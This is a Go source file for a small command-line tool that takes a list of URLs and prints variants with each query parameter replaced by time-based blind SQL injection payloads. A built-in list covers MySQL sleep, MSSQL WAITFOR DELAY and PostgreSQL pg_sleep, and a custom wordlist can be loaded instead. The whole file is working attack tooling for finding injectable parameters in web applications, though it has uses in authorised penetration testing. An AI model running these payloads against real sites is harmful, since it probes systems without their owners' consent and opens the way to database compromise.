package main

import (
	"bufio"
	"flag"
	"fmt"
	"net/url"
	"os"
)

func main() {
	// Define command-line flags
	wordlistFlag := flag.String("w", "", "Path to the wordlist file for payloads")
	fileFlag := flag.String("f", "", "Path to the file containing URLs")
	flag.Parse()

	// Check if the -w flag is provided
	useWordlist := *wordlistFlag != ""

	// Initialize payloads
	var payloads []string

	if useWordlist {
		// Read payloads from the provided wordlist
		wordlistFile, err := os.Open(*wordlistFlag)
		if err != nil {
			fmt.Printf("Error opening wordlist file: %s\n", err)
			return
		}
		defer wordlistFile.Close()

		scanner := bufio.NewScanner(wordlistFile)
		for scanner.Scan() {
			payloads = append(payloads, scanner.Text())
		}
		if err := scanner.Err(); err != nil {
			fmt.Printf("Error reading wordlist file: %s\n", err)
			return
		}
	} else {
		// Default payloads if no wordlist is provided
		payloads = []string{
			"XOR(if(now()=sysdate(),sleep(5),0))OR",
			"if(now()=sysdate(),sleep(5),0)",
			"(select(0)from(select(sleep(5)))v)/*'+(select(3)from(select(sleep(5)))v)+'\"+(select(0)from(select(sleep(5)))v)\"*/",
			"XOR(if(now()=sysdate(),sleep(5*1),0))XOR'Z",
			"1 AND (SELECT * FROM (SELECT(SLEEP(5)))YYYY) AND '%'='",
			"1'XOR(if(now()=sysdate(),sleep(5),0))OR",
			"1 AND (SELECT 1337 FROM (SELECT(SLEEP(5)))YYYY)-1337",
			"1 or sleep(5)#",
			"WAITFOR DELAY '0:0:5'--",
			"%';SELECT PG_SLEEP(5)--",
			"pg_sleep(5)",
			"| |pg_sleep(5)--",
		}
	}

	// Process URLs from the provided file or from standard input
	var scanner *bufio.Scanner
	if *fileFlag != "" {
		file, err := os.Open(*fileFlag)
		if err != nil {
			fmt.Printf("Error opening file with URLs: %s\n", err)
			return
		}
		defer file.Close()
		scanner = bufio.NewScanner(file)
	} else {
		// Read URLs from standard input
		scanner = bufio.NewScanner(os.Stdin)
	}

	for scanner.Scan() {
		originalURL := scanner.Text()
		u, err := url.Parse(originalURL)
		if err != nil {
			fmt.Printf("Error parsing URL: %s\n", err)
			continue
		}

		queryParams := u.Query()
		originalQueryParams := make(url.Values)

		// Create a copy of the original query parameters
		for paramName, values := range queryParams {
			originalQueryParams[paramName] = values
		}

		for paramName, values := range originalQueryParams {
			for _, payload := range payloads {
				// Replace the value of the current parameter with the payload
				queryParams[paramName] = []string{payload}
				u.RawQuery = queryParams.Encode()
				modifiedURL := u.String()
				fmt.Println(modifiedURL)

				// Reset the URL to its original state for the next iteration
				queryParams[paramName] = values
			}
		}
	}
}
